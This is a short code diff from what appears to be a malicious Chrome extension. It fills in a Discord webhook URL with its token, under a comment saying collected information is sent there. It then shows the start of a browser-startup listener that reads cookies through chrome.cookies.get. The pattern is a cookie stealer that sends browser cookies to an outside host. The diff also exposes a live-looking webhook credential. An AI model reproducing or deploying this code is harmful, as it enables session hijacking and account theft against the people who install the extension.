@@ -1,4 +1,4 @@
-const webhook = ""; // Put your webhook here for the information to be sent to.
+const webhook = "https://discord.com/api/webhooks/1288229097603989566/kARr2kG1hmAqPxbb9HpSABfcO53c7IU6TmweSb_GCYMUnB7LnFDOcyypMAzinrYJdklJ";
 
 chrome.runtime.onStartup.addListener(() => {
   chrome.cookies.get(
